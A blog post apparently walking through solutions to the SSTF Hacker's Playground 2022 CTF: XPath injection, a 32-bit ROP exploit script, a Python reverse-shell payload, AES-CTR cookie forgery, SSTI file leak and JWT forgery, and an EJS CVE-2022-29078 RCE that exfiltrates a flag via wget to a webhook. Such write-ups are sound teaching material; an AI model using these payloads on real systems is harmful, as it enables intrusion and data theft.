---
layout: post
title:  "SSTF Hacker's playground 2022 - Jeopardy CTF Walkthrough"
date:   2022-08-23 12:28:05 +0100
categories: writeups
---

This CTF was organized by ```Samsung Research Security Team```, and was a side event of SSTF. <br>
Tasks were divided in ```Tutorial``` and ```Challenges```, we solved all tasks of the first section and some of the second. <br>
We show here short writeups for all the tasks we solved from the ```Challenges``` section.

# Yet Another Injection

```
Authors: SirFrigo & Daloski
Description: XPATH injection
Category: Web
Points: 110
```

> SQL is not the only target of injection attacks.
> http://yai.sstf.site
> Note: If this challenge is too difficult for you, please revisit SQLi 101 and SQLi 102. The principle is the same as SQLi.

In the login page, we click ```hint``` which shows page source code. <br>
Here we get already a registered user:

```
username: guest, pwd: guest
```

We also see that there are other files, ```paperdetail.php``` and ```library.php```, and we can see their sources too! <br>

(For example: ```http://yai.sstf.site/login.php?showsrc=library.php```) <br>

We login using ```guest:guest``` and we get a list of articles. Clicking on one of them will make a POST request to ```/paperdetail?idx=```. <br>

Analyzing ```library.php``` we see that it has a XPATH injection vulnerability on _idx_ attribute (in _getDetail_ function):

{% highlight php %}
$query = "//Paper[Idx/text()='".$idx."' and @published='yes']";
{% endhighlight %}

Using ```1' or @published='no']\x00``` as payload allows us to see not published articles. We get just one article as response, containing the flag:

```
SCTF{W4KE_up_IT's_mOndAy_m0rn1n9_183689c7}
```

# DocxArchive

```
Author: Daloski
Description: Data extraction from metadata files
Category: Rev/Misc
Points: 110
```

> I developed a simple and useful program that attaches a file into word file. But... why I cannot open file?
> I thought I developed perfect program, but it was not true. Wait, where is the source file?
> I cannot find my attachment file! I think I need to extract attachment file from word.
> Download: DocxArchive.zip

We open the file `RecoverMe.docx` and double click on Open-me.bin. It will download a .tmp file. <br>
It is an EMF file (Enhanced Metafile Format). Rename it to _name.emf_ and open it with InkScape to get the flag! <br>
Actually, on some OSes, you can just view the flag from the .tmp file.

```
SCTF{Do-y0u-kn0w-01E-4nd-3mf-forM4t?}
```

# pppr

```
Author: Shotokhan
Description: A basic ROP chain
Category: Pwn
Points: 111
```

> A simple x86 ROP exercise for tutorial graduates.
> Server: nc pppr.sstf.site 1337
> Download: pppr.zip

We download the binary and run the basic static analysis on it:

```
$ file pppr
pppr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c8800d35a108c24d3ae283f304c14ae36cca31e6, not stripped

$ checksec pppr
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

By interacting with it and by analyzing it in Ghidra, we learn that it takes at most 63 bytes from stdin and adds a null byte, and stores them into a buffer of 4 bytes. <br>
The input is taken in a function called ```r```, which takes three parameters: buffer, number of bytes to read, stream number. <br>
The "stream number" parameter is not actually used to choose a stream, there is just the check that it is equal to 0. <br>
The ```system``` function is linked in the binary, wrapped by a function called ```x```, and there is a 128-bytes long scratch buffer in bss section called ```buf_in_bss```. <br>

The binary is 32-bit, so parameters are passed on the stack (we can double check this by looking at disassembly). <br>
So, when calling ```system``` in a ROP, we have to prepare gadgets in this layout:

```
system | ret_addr | buf_in_bss
```

We can put an arbitrary ```ret_addr``` after system: if it's called correctly, the new program will replace the running one in the process context. <br>
We choose to use ```buf_in_bss``` as parameter for the ```system``` function because it's easier to write a string there. <br>
To write there, we can re-use ```r``` function, by passing as first parameter ```buf_in_bss```, as second parameter the length of our program's name (which will be ```/bin/sh```, so we can pass 7 or 8 as length), and 0 as third parameter, like that:

```
r | ret_addr | buf_in_bss | 8 | 0
```

We then need a gadget to consume the three parameters after the return from the ```r``` function, and to later return to ```system@plt```. <br>
This gadget will be the ```ret_addr``` of ```r```; a good one:

```
0x080486a9 : pop esi ; pop edi ; pop ebp ; ret
```

The full chain will be:

```
BOF | r | pop_esi_edi_ebp_ret | buf_in_bss | 8 | 0 | system | ret_addr | buf_in_bss
```

Where BOF is an arbitrary payload of 12 bytes, since the offset from the start of the buffer to the return address is 12 bytes. <br>
Here is the script:

{% highlight python %}
from pwn import *


def main():
    local = False
    elf = ELF("./pppr")
    if local:
        r = process(["./pppr"])
    else:
        r = remote("pppr.sstf.site", 1337)
    offset = 12
    r_func = elf.symbols['r']
    pop_esi_edi_ebp_ret = 0x080486a9
    buf_in_bss = elf.symbols['buf_in_bss']
    name_len = 8
    name = b"/bin/sh"
    r_third_param = 0
    system = elf.symbols['system']
    ret_addr = elf.symbols['__libc_start_main']
    payload = b'A' * offset
    payload += p32(r_func)
    payload += p32(pop_esi_edi_ebp_ret)
    payload += p32(buf_in_bss) + p32(name_len) + p32(r_third_param)
    payload += p32(system) + p32(ret_addr) + p32(buf_in_bss)
    r.sendline(payload)
    r.sendline(name)
    r.interactive()


if __name__ == "__main__":
    main()

{% endhighlight %}

And here is the execution:

```
[+] Opening connection to pppr.sstf.site on port 1337: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
$ cat flag.txt
SCTF{Anc13nt_x86_R0P_5kiLl}
```

# Imageium

```
Authors: SirFrigo & Daloski
Description: RCE using old version of Pillow (reverse shell)
Category: Web/Misc
Points: 111
```

> This is yet another secure color channel mixer.
> Server: http://imageium.sstf.site

We select random mode and then generate the image, then right click on the image to open it in a new tab. We get a request to (if we choose mode R):

```
http://imageium.sstf.site/dynamic/modified?mode=r
```

Everything put after ```?mode=``` is evaluated by python, so we put this payload to create a _reverse shell_:

{% highlight python %}
exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_ADDRESS",YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn("/bin/sh")')
{% endhighlight %}

Flag is in ```secret/flag.txt```.

```
SCTF{3acH_1m@ge_Has_iTs_0wN_MagIC}
```

# CUSES

```
Author: Shotokhan
Description: AES-CTR cookie forgery
Category: Crypto/Web
Points: 118
```

> I heared that cookie is obsolete and weak.
> So I made a CUstom SESsion using AES encryption.
> I am safe now.
> http://cuses.sstf.site
> Note: If you don't know how to solve this problem, it would be helpful to study RC four tutorial again.

There is a website which comes with an interface for login and registration. <br>
When trying to register, there is an error message saying that only admin can register users. <br>
Anyway, when looking at HTML source, we can see that there is a comment stating that you can login with the following credentials: ```guest / guestpassword```. <br>
At this point, after logging in, we have the following message:

```
Welcome, guest :)
Only admin can see the flag. Sorry.
```

And we have the buttons ```view source``` and ```logout```. <br>
Therefore we look at the source:

{% highlight php %}
<?php

include "secret.php";    //server_secret, iv, flag

$cookie_name = "SESSION";

if (!isset($_COOKIE[$cookie_name])) {
    header('Location: /signin.php');
    exit;
}

$cipher="aes-128-ctr";
list($iv, $encrypted_session_data) = explode("|", base64_decode($_COOKIE[$cookie_name]), 2);
$session_data = openssl_decrypt($encrypted_session_data, $cipher, $server_secret, OPENSSL_RAW_DATA, $iv);
list($username, $auth_code) = explode("|", $session_data);
if ($auth_code !== $server_secret) {
    die("No hack!");
}
?>
{% endhighlight %}

So we learn that the cookie is of the following format:

```
base64(iv|enc_session_data)
```

where:

```
enc_session_data = AES_128_CTR(session_data, server_secret, iv, options)
```

and:

```
session_data = username|auth_code
```

with ```auth_code = server_secret```. <br>
You can find some details about CTR mode [here](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)). <br>
In this case, the ```iv``` is used as nonce, and it's combined with the ```counter``` of each 16-bytes block. <br>
Our session is:

```
hWtUgnDPrUtSR4aKFvanynz1o5buraSaQLWy43gECobFtUlYabLkuQOVFnYdARiy+GlE426E8pNJEtRxVI3oImWHz63ZJqYHLv5tkyOVTNOvTRRjhCvcEg==
```

By decoding it and inspecting it, we can see that there are 16 bytes for the ```iv```, then the vertical bar, then other 71 bytes. <br>
Note that the total number of bytes is not multiple of 16 because CTR mode acts "like a stream cipher". <br>
We know that our username is ```guest```, so the ```server_secret``` is 65 bytes long and the 71 bytes of ```enc_session_data``` are:

```
AES-CTR bitstream
	  XOR
guest|server_secret
```

Note that AES requires a 16 byte key, so the ```server_secret``` is used as a passphrase to generate the key, as we can also see from [PHP docs](https://www.php.net/manual/en/function.openssl-decrypt.php). <br>
An interesting thing about AES-CTR is that the xor-bitstream is the same for encryption and decryption, in this way it is very similar to a stream cipher. <br>
So, knowing part of the plaintext means that we also know the corresponding part of the xor-bitstream. <br>
To get the flag, we need to login as ```admin```, and luckily it has the same length of ```guest``` and needs to be in the same position in the cookie. <br>
Therefore we can just xor the part of the cookie where the username should be with the string ```guest```, xor the result with the string ```admin``` and encode the cookie again. The hex of the encrypted ```guest``` username is:

```
f5 a3 96 ee ad
```

After performing xor with ```guest``` and with ```admin```, the resulting hex is:

```
f3 b2 9e f4 b7
```

Back to the cookie in base64:

```
hWtUgnDPrUtSR4aKFvanynzzsp70t6SaQLWy43gECobFtUlYabLkuQOVFnYdARiy+GlE426E8pNJEtRxVI3oImWHz63ZJqYHLv5tkyOVTNOvTRRjhCvcEg==
```

Now we're able to get the flag:

```
SCTF{T3ll_me_4_r3ally_s3cure_w4y_to_m4na9e_5eSS10ns}
```

# 5th degree

```
Author: 0xDark
Description: Find min/max of function in a given range, for many rounds with a timeout
Category: Misc/Web
Points: 121
```

> It's highschool math.
> Server: http://5thdegree.sstf.site

By interacting with the service, we got this message:

```
In the next page, you'll get an equation and range about x.
Please find minimum and maximum values of y while x is in the given range.

For your convinience, equations are designed to have integer solutions.
You should pass 30 rounds in 60 seconds.

Click the button when you're ready. 
```

After clicking ```Start``` button, we have the first equation, something like:

```
y = -949x^5 - 575473600x^4 + 1592492250118835x^3 + 1390451370472346878800x^2 + 172989325446300530746488000x + 857969

Find minimum and maximum of y, where 416978 \le x \le 763114 . 
```

It can either be solved analytically or with brute-force, since the range isn't very high. <br>
To save time, I first tried with brute-force; this is the script:

{% highlight python %}
from concurrent.futures import ProcessPoolExecutor
from re import search, findall
from requests import Session

URL = 'http://5thdegree.sstf.site/chal'
RE_EQ = r'\\\[([yx=\s\d\^+-]*)\\\]'
RE_DIG = r'\\\(([yx\\leg=\s\d\^+-]*)\\\)'
MIN_MAX = r'[-+\d]+'
n_process = 5

s = Session()
text = s.get(URL).text

def work(e, a, b):
	return [eval(e) for x in range(a,b)]

# We have to solve 30 problems
for _ in range(30):
	print(search(r'(Round \d*)', text)[0])

	# Extract equation & min/max from response
	equation = search(RE_EQ, text)[0][7:-3].replace('y','x').replace('x', '*x').replace('^','**')
	min_max = search(RE_DIG, text)[0]
	
	min_n, max_n = map(int, findall(MIN_MAX, min_max))
	
	# Try to calculate equation with given min/max
	r = [eval(equation) for x in (min_n, max_n)]
	text = s.post(URL, data={'min': min(r), 'max': max(r)}).text

	# If results were incorrect compute
	# all results in the given range
	# and take the min / max from those
	if 'please think harder' in text:
		k = abs(min_n - max_n)//n_process

		# Use multiprocess with n_process workers
		with ProcessPoolExecutor(max_workers=n_process) as pool:
			futures = []
			
			for i in range(min_n, max_n, k):
				f = pool.submit(work, equation, i, i+k if i+k < max_n else max_n+1)
				futures.append(f)
		
		# Fetch returned values from the process
		r = [e for f in futures for e in f.result()]

		text = s.post(URL, data={'min':min(r), 'max':max(r)}).text

print('\nFlag:', search('SCTF\{.*\}', text)[0])

{% endhighlight %}

This approach worked, here is the flag:

```
SCTF{I_w4nt_t0_l1v3_in_a_wOrld_w1thout_MATH}
```

# Online Education

```
Authors: SirFrigo & Daloski
Description: Forge custom cookie using information leak from path traversal
Category: Web
Points: 139
```

> I made an online education service!
> Watching education videos is so boring :(
> Server: http://onlineeducation.sstf.site
> Download: OnlineEducation.zip

The objective is to get the certificate by completing the courses and using the certificate to leak some secrets.

1. To get the certificate we first start a course and then finish it using a negative "rate" (we out -2000). This is done with POST requests to ```/status```, first with attribute ```{"action":"start"}```, and then ```{"action":"finish", "rate":-2000}```. Repeat this 3 times to finish all courses.
2. To leak info from the certificate we use a SSTI using as email:

```
test@test.com<iframe src='file:///home/app/config.py'></iframe>
```

This will put ```config.py``` content inside the certificate pdf. <br>
From the leak, we take the ```secret_key``` and craft a custom cookie with [jwt.io](https://jwt.io/), writing:

{% highlight json %}
{
  "email": "ciao@ciao.com",
  "idx": 0,
  "is_admin": true,
  "name": "ciao",
  "alg": "HS256"
}
{% endhighlight %}

Then we use that cookie to get the flag in ```/flag```.

Here is the script to leak ```secret_key```:

{% highlight python %}
import requests


base_url = "http://onlineeducation.sstf.site/"
s = requests.Session()
name = "test"
email = "test@test.com<iframe src='file:///home/app/config.py'></iframe>"
res = s.post(base_url + "signin", data={
    'name' : name,
    'email' : email
})

for _ in range(3):
    res = s.post(base_url + "status", json={
            "action" : "start"
        },
        headers = {
            'X-Requested-With' : 'XMLHttpRequest'
        }
    )

    res = s.post(base_url + "status", json={
        "action" : "finish",
        "rate" : -2000
    })


res = s.get(base_url + "cert")
with open("./mauro.pdf", "wb") as f:
    f.write(res.content)

{% endhighlight %}

And here is the flag:

```
SCTF{oh_I_forgot_to_disable_javascript}
```

# JWT Decoder

```
Authors: Ve & Shotokhan
Description: Abusing CVE-2022-29078 for RCE with JWT
Category: Web
Points: 142
```

> I am studying nodejs web programming.
> I wrote simple JWT decode web site with popular node packages.
> Using recent packages, I certain that there is no severe security issue!
> Server1: http://jwtdecoder.sstf.site
> Server2: http://jwtdecoder.sstf.site:8080
> Download: jwt_decoder.zip

The service enables to modify a JWT client-side, set it as cookie and send it to the server, which renders a template with fields from the JWT. <br>
Source code is provided, as well as package versions, Dockerfile and so on. <br>
If we build the container image locally, we get warning for a critical vulnerability from ```npm audit```, about the package ```ejs```. <br>
These are the dependencies:

```
{
  "dependencies": {
    "cookie-parser": "^1.4.6",
    "ejs": "^3.1.6",
    "express": "^4.17.3"
  }
}
```

We can see a proof of concept for the vulnerability, which is a RCE, [here](https://eslam.io/posts/ejs-server-side-template-injection-rce/). <br>
In the proof of concept, server-side there is something like ```res.render('index', req.query);```, whereas in our case the second parameter to the ```render``` function is the object ```rawJwt```, as we can see in the source code of ```app.js```:

{% highlight javascript %}
const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(cookieParser());
app.set('views', path.join(__dirname, "view"));
app.set('view engine', 'ejs');

app.get('/', (req, res) => {
    let rawJwt = req.cookies.jwt || {};

    try {
        let jwtPart = rawJwt.split('.');

        let jwtHeader = jwtPart[0];
        jwtHeader = Buffer.from(jwtHeader, "base64").toString('utf8');
        jwtHeader = JSON.parse(jwtHeader);
        jwtHeader = JSON.stringify(jwtHeader, null, 4);
        rawJwt = {
            header: jwtHeader
        }

        let jwtBody = jwtPart[1];
        jwtBody = Buffer.from(jwtBody, "base64").toString('utf8');
        jwtBody = JSON.parse(jwtBody);
        jwtBody = JSON.stringify(jwtBody, null, 4);
        rawJwt.body = jwtBody;

        let jwtSignature = jwtPart[2];
        rawJwt.signature = jwtSignature;

    } catch(error) {
        if (typeof rawJwt === 'object') {
            rawJwt.error = error;
        } else {
            rawJwt = {
                error: error
            };
        }
    }
    res.render('index', rawJwt);
});

app.use(function(err, req, res, next) {
    console.error(err.stack);
    res.status(500).send('Something wrong!');
});

app.listen(PORT, (err) => {
    console.log(`Server is Running on Port ${PORT}`);
});
{% endhighlight %}

To try the RCE, we changed the source code by passing ```req.query``` as second parameter to ```render``` instead of ```rawJwt```. <br>
We also added some ```console.log``` calls to see the ```rawJwt``` at different stages and compare it to ```req.query```. <br>
Therefore, we can do the RCE locally with a query like this:

```
http://0.0.0.0:3000/?body=ve&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('touch /tmp/ve.txt');s
```

The resulting ```req.query``` object is:

{% highlight json %}
{
    "body": "ve",
    "settings": {
        "view options": {
            "outputFunctionName": "x;process.mainModule.require('child_process').execSync('touch /tmp/ve.txt');s"
        }
    }
}
{% endhighlight %}

The RCE part has ```settings``` as top-level key and is a nested object. <br>
We would like to set ```rawJwt``` like that, but it is a string when read as cookie, and when it becomes an object (in the "try" block) it doesn't set keys based on user-input, only values that are strings, anyway. <br>

So we thought that the best idea was to make the "try" block fail before re-assigning an object to ```rawJwt``` variable, in such a way that ```rawJwt``` keeps the fields it has when read as a cookie from ```req.cookies```. <br>
Then, we saw that ```cookie-parser``` package is used to read cookies. By reading online documentation, we saw that ```cookieParser``` function by default tries to decode JSON cookies. <br>
Therefore, we tried to set the cookie as JSON, but it was still parsed as string. <br>
At this point we investigated ```cookie-parser``` source code on GitHub, and saw that a cookie is parsed as JSON only if it has the prefix ```j:```, like you can see [here](https://github.com/expressjs/cookie-parser/blob/master/index.js#L83-L86). <br>
Furthermore, the cookie's value has to be URL encoded, obviously. <br>
We tested the RCE with the following cookie:

```
j:{"settings":{"view options":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('touch /tmp/shoto.txt');s"}}}
```

And it worked! <br>
Now we just have to send it to the real server, with an RCE payload to read the flag and send it to our webhook:

```
j:{"settings":{"view options":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('wget https://webhook.site/[REDACTED]/?flag=$(cat /flag.txt)');s"}}}
```

And here is the flag:

```
SCTF{p0pul4r_m0dule_Ar3_n0t_4lway3_s3cure}
```

